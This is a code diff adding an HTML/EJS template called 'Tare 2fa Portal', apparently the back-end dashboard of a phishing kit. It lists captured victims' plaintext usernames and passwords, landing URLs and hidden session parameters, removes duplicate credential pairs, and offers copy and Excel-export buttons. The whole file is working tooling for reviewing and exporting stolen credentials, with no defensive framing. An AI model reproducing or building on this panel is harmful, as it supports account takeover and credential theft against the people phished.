@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Tare</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <link rel="shortcut icon" type="image/png" href="https://img.icons8.com/ios/452/hacker.png">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-image: url('https://source.unsplash.com/1920x1080/?coding,programming');
+            background-size: cover;
+            color: #fff;
+        }
+
+        header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            background-color: #333;
+        }
+
+        header img {
+            max-width: 50px;
+            margin-bottom: 10px;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+
+        .session {
+            margin: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th,
+        td {
+            border: 1px solid #ddd;
+            padding: 10px;
+            text-align: left;
+            color: #fff;
+        }
+
+        th {
+            background-color: #333;
+        }
+
+        tr:nth-child(even) {
+            background-color: #555;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        @media screen and (max-width: 600px) {
+            .total,
+            .count {
+                min-width: 100%;
+                margin-left: 0;
+            }
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+</head>
+
+<body>
+    <header>
+        <img src="https://img.icons8.com/ios/452/hacker.png" alt="Logo">
+        <h1>Tare 2fa Portal</h1>
+    </header>
+
+    <div class="session">
+        <button onclick="exportTableToExcel()">Export as Excel</button>
+        <table id="t01">
+            <thead>
+                <tr>
+                    <th>Session Number</th>
+                    <th>Landing URL</th>
+                    <th>Username <br><br>Password</th>
+                    <th>Custom Parameters</th>
+                </tr>
+            </thead>
+            <% 
+                const uniqueSessions = [];
+                data.filter(item => item.username && item.password && item.password.length <= 100).forEach(item => {
+                    const found = uniqueSessions.find(session => session.username === item.username && session.password === item.password);
+                    if (!found) {
+                        uniqueSessions.push(item);
+                    }
+                });
+                uniqueSessions.map(item => {%>
+                    <tr>
+                        <td><%= item.id %></td>
+                        <td><%= item.landing_url %></td>
+                        <td><%= item.username %><br><br><%= item.password %></td>
+                        <td><button onclick="myFunction(this)">
+                                Copy Details
+                                <span style="display: none"><%= JSON.stringify(item.custom) %></span>
+                            </button>
+                        </td>
+                    </tr>
+                <% }) %>
+        </table>
+    </div>
+
+    <script>
+        function myFunction(ele) {
+            var input = document.createElement('textarea');
+            input.innerHTML = ele.children[0].innerText;
+            document.body.appendChild(input);
+            input.select();
+            document.execCommand('copy');
+            document.body.removeChild(input);
+            alert("Copied the text: " + ele.children[0].innerText);
+        }
+
+        function exportTableToExcel() {
+            var wb = XLSX.utils.table_to_book(document.getElementById('t01'));
+            XLSX.writeFile(wb, 'data.xlsx');
+        }
+    </script>
+</body>
+
+</html>
